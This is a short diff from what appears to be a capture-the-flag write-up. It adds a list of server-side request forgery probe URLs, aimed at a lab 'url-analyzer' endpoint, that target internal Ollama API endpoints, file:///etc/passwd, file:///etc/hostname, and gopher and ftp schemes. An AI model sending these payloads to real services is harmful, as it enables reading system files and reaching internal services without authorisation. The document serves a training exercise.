@@ -76,7 +76,15 @@ while IFS= read -r url; do
 done < urls.txt
 ```
 ```
-[spirit@archlinux sq3-aoc2025-bk3vvbcgiT]$ nano urls.txt
+[spirit@archlinux sq3-aoc2025-bk3vvbcgiT]$ cat urls.txt 
+http://host.docker.internal:11434/api/version
+http://host.docker.internal:11434/api/ps
+http://host.docker.internal:11434/api/show
+http://host.docker.internal:11434/api/tags
+file:///etc/hostname
+file:///etc/passwd
+ftp://example.com
+gopher://127.0.0.1
 [spirit@archlinux sq3-aoc2025-bk3vvbcgiT]$ #!/usr/bin/env bash
 
 TARGET="http://url-analyzer.hopaitech.thm/analyze"
